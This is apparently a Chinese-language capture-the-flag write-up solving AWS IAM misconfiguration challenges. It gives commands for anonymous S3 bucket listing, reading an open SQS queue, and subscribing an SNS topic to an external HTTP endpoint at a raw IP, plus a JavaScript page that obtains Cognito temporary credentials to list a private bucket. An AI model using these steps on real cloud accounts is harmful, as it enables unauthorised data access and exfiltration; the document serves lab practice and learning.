https://annevi.cn/2021/03/25/2021-spring-interview/







## 靶场


### Oss配置
https://bigiamchallenge.com/challenge/1
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

1. 拼接oss得到路径
`http://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com`
2. 使用aws console
`aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/  --no-sign-request`

### sqs配置
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

sqs(simple queue service)简单队列服务,表示允许任何主体发送和接收消息

`aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2`
接收消息

### sns配置
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
允许任何主体订阅通知,但是限制了邮箱后缀.

`aws sns subscribe --protocol http --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --notification-endpoint http://81.70.163.152/@tbic.wiz.io`

---
上面的服务好像挂了

> 根据官方文档的描述，在进行 Subscribe 时，如果当前和订阅的主题不在一个 AWS 账号下，还需要进行确认操作，在进行确认操作的时候，就需要使用主题返回的 Token 值了。
我们使用以下命令进行确认操作。
 `aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --token 336412f37fb6`


### oss
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

只允许admin列出桶,只要得到flag的key,那么就能读取到flag

---
大致意思是，匹配 PrincipalArn 的字符串是否为 arn:aws:iam::133713371337:user/admin，其他条件同第一题。

这里可以利用匿名访问来绕过这个限制，解法和第一题一致。

`aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request`

### cognito
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "VisualEditor0",
      "Effect": "Allow",
      "Action": [
        "mobileanalytics:PutEvents",
        "cognito-sync:*"
      ],
      "Resource": "*"
    },
    {
      "Sid": "VisualEditor1",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::wiz-privatefiles",
        "arn:aws:s3:::wiz-privatefiles/*"
      ]
    }
  ]
}
```
> AWS Cognito 是一项托管服务，可帮助开发人员轻松添加用户身份验证和授权功能到应用程序中。它提供了用于注册、登录和管理用户的功能，支持常见的身份验证方法，如用户名/密码、社交媒体登录和身份提供商集成。Cognito 还提供了用户身份验证的安全性、可伸缩性和可定制性，并与其他 AWS 服务集成，使开发人员能够构建安全可靠的应用程序。

> 根据官方文档的描述，要使用 Cognito 需要先创建一个 Amazon Cognito 身份池，然后填入创建的身份池 ID 去调用 SDK 获取临时凭证，最后通过临时凭证去操作资源。

只要获取到身份池id,就有操作权限了

```html
<!DOCTYPE html>
<html>
<head>
    <title>Cognito JavaScript SDK Example</title>
    <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>
<body>
    <script>
        // 初始化AWS SDK配置
        AWS.config.region = 'us-east-1';
        AWS.config.credentials = new AWS.CognitoIdentityCredentials({
            IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
        });
        // 获取临时凭证
        AWS.config.credentials.get(function(err) {
            if (!err) {
                // 凭证获取成功
                var accessKeyId = AWS.config.credentials.accessKeyId;
                var secretAccessKey = AWS.config.credentials.secretAccessKey;
                var sessionToken = AWS.config.credentials.sessionToken;

                // 进行后续操作，如访问S3
                accessS3(accessKeyId, secretAccessKey, sessionToken);
            } else {
                // 凭证获取失败
                console.error('Error retrieving credentials: ' + err);
            }
        });
        // 使用临时凭证访问S3
        function accessS3(accessKeyId, secretAccessKey, sessionToken) {
            var s3 = new AWS.S3({
                accessKeyId: accessKeyId,
                secretAccessKey: secretAccessKey,
                sessionToken: sessionToken,
            });
            var params = {
                Bucket: 'wiz-privatefiles',
            };
            s3.getSignedUrl('listObjectsV2', params, function(err, data) {
                if (!err) {
                    // S3存储桶列表获取成功
                    console.log(data);
                } else {
                    // S3存储桶列表获取失败
                    console.error('Error listing S3 buckets: ' + err);
                }
            });
        }
    </script>
</body>
</html>
```

